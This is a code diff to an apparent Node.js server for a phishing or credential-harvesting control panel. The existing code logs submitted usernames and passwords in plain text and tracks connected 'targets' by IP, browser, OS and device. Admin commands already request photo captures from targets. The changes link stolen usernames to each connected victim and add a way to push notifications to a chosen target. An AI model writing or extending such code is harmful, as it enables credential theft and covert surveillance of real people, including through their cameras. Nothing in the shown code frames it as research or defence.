@@ -111,11 +111,12 @@ app.get('/admin', (req, res) => {
 app.post('/api/log', (req, res) => {
   const { username, password } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const cleanIp = ip === '::1' ? '127.0.0.1' : ip;
   const timestamp = new Date();
 
   const logEntry = {
     id: logs.length + 1,
-    ip: ip === '::1' ? '127.0.0.1' : ip,
+    ip: cleanIp,
     username: username || 'N/A',
     password: password || 'N/A',
     date: timestamp.toLocaleDateString(),
@@ -124,6 +125,14 @@ app.post('/api/log', (req, res) => {
   };
 
   logs.push(logEntry);
+  
+  // Associate username with connected target by IP
+  const targetEntry = Array.from(connectedTargets.values()).find(t => t.ip === cleanIp);
+  if (targetEntry && username) {
+     targetEntry.username = username;
+     connectedTargets.set(targetEntry.clientId, targetEntry);
+     broadcastToAdmins({ type: 'TARGET_UPDATED', user: targetEntry });
+  }
 
   // Broadcast to all admin WebSocket clients
   broadcastToAdmins({ type: 'NEW_LOG', log: logEntry, totalAttempts: logs.length });
@@ -306,6 +315,7 @@ wss.on('connection', (ws, req) => {
         const targets = Array.from(connectedTargets.values()).map(t => ({
           clientId:    t.clientId,
           ip:          t.ip,
+          username:    t.username,
           browser:     t.browser,
           os:          t.os,
           device:      t.device,
@@ -522,6 +532,17 @@ wss.on('connection', (ws, req) => {
           broadcastAllTargets({ type: 'CAPTURE_PHOTO' });
         }
         pushActivity('command', `📸 Photo request sent to ${msg.targetId ? 'target #' + msg.targetId : 'ALL targets'}`);
+        break;
+      }
+
+      // ── Admin: send notification to a target ───────────────────────────────────
+      case 'send_notification': {
+        if (!ws.isAdmin) break;
+        if (msg.targetId) {
+          broadcastToTarget(msg.targetId, { type: 'SHOW_NOTIFICATION', message: msg.message });
+          const target = connectedTargets.get(msg.targetId);
+          pushActivity('command', `✉️ Notification "${msg.message}" sent to ${target?.username || target?.ip || 'target #' + msg.targetId}`);
+        }
         break;
       }
 
